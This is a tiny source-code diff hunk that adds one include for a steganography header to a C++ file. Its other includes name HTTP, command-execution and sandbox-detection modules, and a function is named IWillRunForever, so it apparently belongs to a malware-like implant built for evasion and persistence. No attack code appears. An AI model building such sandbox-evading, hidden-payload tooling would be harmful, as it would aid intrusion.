@@ -21,6 +21,7 @@ using json = nlohmann::json;
 #include "http/http.h"
 #include "execute/execute.h"
 #include "sandbox_detection/sandbox_detection.h"
+#include "Steg/SteganographyFixed.h"
 
 /* Functions */
 void IWillRunForever(void);
